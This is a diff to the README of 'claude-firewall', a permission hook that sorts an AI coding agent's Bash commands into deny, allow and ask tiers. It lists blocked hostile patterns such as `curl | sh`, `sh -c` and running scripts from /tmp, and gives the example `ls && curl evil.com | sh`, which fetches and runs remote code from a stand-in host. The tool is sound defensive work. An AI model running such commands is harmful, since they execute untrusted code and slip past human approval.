@@ -18,7 +18,7 @@ claude-firewall adds that layer — a tiered policy engine that auto-approves sa
 
 claude-firewall is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts every Bash command before execution and routes it through a tiered policy. Requires `jq`.
 
-**Tier 1 — DENY:** Hard-blocks catastrophic patterns. No override, no prompt. Includes:
+**Tier 1 — DENY:** Hard-blocks catastrophic patterns. No override, no prompt. `exit 2` with stderr message. Includes:
 - Shell injection (`curl | sh`, `| /bin/bash`, `eval`, pipe-to-shell — bare and full-path variants)
 - Shell execution of files (`sh /tmp/x.sh`, `/bin/bash ./script.sh`, `exec ./x`, `source ./x`, `. ./x`)
 - Shell `-c` execution (`sh -c "..."`, `bash -c "..."`, `/usr/bin/bash -c "..."`)
@@ -36,9 +36,14 @@ claude-firewall is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude
 
 **Tier 1e — SENSITIVE DOTFILE GUARD:** Writes to sensitive user dotfiles (`~/.ssh/`, `~/.gnupg/`, `~/.bashrc`, `~/.zshrc`, `~/.env`, etc.) are forced to ASK. Legitimate but worth human review.
 
-**Tier 2 — ALLOW:** Known-safe commands auto-approve without prompting. Covers git, npm, node, python, cargo, go, make, file inspection, search tools, text processing, Docker reads, gh CLI, and more. **Compound commands are split** on `&&`, `||`, `|`, `;`, `&` and each segment is checked independently — so `ls && curl evil.com | sh` can't piggyback on `ls` being allowed.
+**Tier 2 — ALLOW:** Known-safe commands auto-approve without prompting. `exit 0` + JSON permission decision. Pattern array checked per-segment after compound-command splitting. Covers git, npm, node, python, cargo, go, make, file inspection, search tools, text processing, Docker reads, gh CLI, and more. **Compound commands are split** on `&&`, `||`, `|`, `;`, `&` and each segment is checked independently — so `ls && curl evil.com | sh` can't piggyback on `ls` being allowed.
 
-**Tier 3 — ASK:** Everything else falls through to Claude Code's normal permission prompt. Every ASK-tier hit is logged to `~/.claude/hooks/firewall-ask.log` (TSV: timestamp, tier, command) so you can review and promote patterns over time.
+**Tier 3 — ASK:** Everything else falls through to Claude Code's normal permission prompt. `exit 0`, no output. Every ASK-tier hit is logged to `~/.claude/hooks/firewall-ask.log` (TSV: timestamp, tier, command) so you can review and promote patterns over time.
+
+Key security properties:
+- Compound commands (`&&`, `||`, `|`, `;`) are split and each segment checked independently. Quote-aware splitting via awk.
+- `$()`, backticks, and process substitutions force ASK tier (never auto-approved).
+- DENY patterns are checked before ALLOW — deny always wins.
 
 ## Install
 
@@ -89,17 +94,50 @@ cut -f3 ~/.claude/hooks/firewall-ask.log | sort | uniq -c | sort -rn | head -20
 
 Commands that appear frequently and are safe can be promoted to ALLOW by adding a pattern to the `ALLOW_PATTERNS` array in `firewall.sh`.
 
+The ASK log is a TSV with columns: `timestamp`, `tier` (always "ASK"), `command`. To synthesize ALLOW patterns from the log:
+
+1. Read the log: `cut -f3 ~/.claude/hooks/firewall-ask.log | sort | uniq -c | sort -rn`
+2. Identify commands that are safe to auto-approve
+3. Write an ERE pattern that matches the command prefix
+4. Verify the pattern doesn't over-match by considering: what other commands could this regex match? Could any of them be dangerous?
+5. Add to the appropriate section of `ALLOW_PATTERNS` with a comment
+
 ### Adding patterns
 
 ALLOW patterns are ERE (extended regular expressions) matched against each command segment. A pattern like `'^mytool\s'` would auto-approve any command starting with `mytool`.
 
 When adding patterns, consider: could a dangerous command match this regex? The compound-command splitter protects against chaining, but an over-broad pattern in ALLOW is the primary risk surface.
 
+When adding patterns to `ALLOW_PATTERNS`:
+- Add a comment naming the tool/category
+- Use `^` anchor and `\s` or `(\s|$)` boundary
+- Place in the appropriate section (or create a new commented section)
+- Include the ASK-log entries that motivated the pattern in the PR description
+
+When adding patterns to `DENY_PATTERNS`:
+- Include a comment explaining what attack the pattern prevents
+- Include example commands the pattern catches
+- Verify the pattern doesn't false-positive on legitimate commands
+
 ### Environment variables
 
 - `CLAUDE_FIREWALL_LOG` — Override the ASK log location (default: `~/.claude/hooks/firewall-ask.log`)
 
 **Privacy note:** The ASK log records full command text in plaintext. If your workflow involves secrets or passwords passed as command arguments, these will appear in the log. The log is gitignored by default but lives on disk at the path above. Set `CLAUDE_FIREWALL_LOG=/dev/null` to disable logging entirely.
+
+## Testing changes
+
+To test a pattern against a command without running it live:
+
+```bash
+echo '{"tool_input":{"command":"your test command here"}}' | ./firewall.sh
+```
+
+- Exit 2 = DENY
+- Exit 0 + JSON output = ALLOW
+- Exit 0 + no output = ASK
+
+Check stderr for DENY messages.
 
 ## How it works with --dangerously-skip-permissions
 
